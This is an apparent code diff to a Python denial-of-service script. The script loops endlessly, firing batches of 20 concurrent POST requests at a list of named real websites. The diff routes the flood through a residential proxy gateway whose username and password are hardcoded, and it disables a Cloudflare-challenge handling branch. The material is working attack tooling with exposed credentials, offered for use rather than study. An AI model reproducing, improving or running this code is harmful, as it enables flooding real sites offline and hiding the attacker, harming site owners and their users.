@@ -16,6 +16,12 @@ PROXY_USER = 'spwn69j9vr'
 PROXY_PASS = '123123123'
 PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gate.smartproxy.com:PORT'
 
+PROXY_URL = PROXY_URL_BASE.replace('PORT',str(10000))
+proxies = {
+'http': PROXY_URL,
+'https': PROXY_URL,
+}
+
 attackList = [
 'https://www.business2community.com',
 # 'https://x-bitcoin-club.com'
@@ -90,6 +96,11 @@ def solveChanellnge(url):
 def attackUrlCF(baseUrl, threadNumber):	
 	# url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 
+	proxies = {
+	'http': PROXY_URL,
+	'https': PROXY_URL,
+	}
+
 	while True:
 		try:
 			url = baseUrl + "?modal=1"
@@ -110,17 +121,17 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			requestsArr = []
 			for x in range(20):
-				requestsArr.append(grequests.post(url, headers=headers, json=data))
+				requestsArr.append(grequests.post(url, headers=headers, json=data, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
 			print(res)
 			print(res[0].content)
 			
-			if str(res[0].status_code) in ['404']:
-				print(str(threadNumber), 'moved!!!! resolsing chalennge', res[0].content)
-				input()
-				url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
-				print(str(threadNumber), 'resolved')
+			# if str(res[0].status_code) in ['404']:
+			# 	print(str(threadNumber), 'moved!!!! resolsing chalennge', res[0].content)
+			# 	input()
+			# 	url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
+			# 	print(str(threadNumber), 'resolved')
 			
 			# input()
 		except Exception as err:
